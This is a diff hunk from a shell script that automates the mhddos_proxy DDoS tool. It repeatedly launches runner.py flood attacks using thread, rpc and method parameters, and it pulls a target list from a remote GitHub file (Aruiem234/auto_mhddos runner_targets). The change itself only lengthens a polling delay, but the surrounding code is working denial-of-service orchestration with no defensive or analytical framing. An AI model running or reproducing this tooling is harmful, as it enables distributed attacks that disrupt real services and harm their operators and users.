@@ -159,7 +159,7 @@ while true; do
         python3 ~/multidd/mhddos_proxy/runner.py -c $file $threads $rpc $methods&
         list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
          while [[ $list_size = "0"  ]]; do
-            sleep 5
+            sleep 8
             list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
         done
         for (( i=1; i<=list_size; i++ )); do
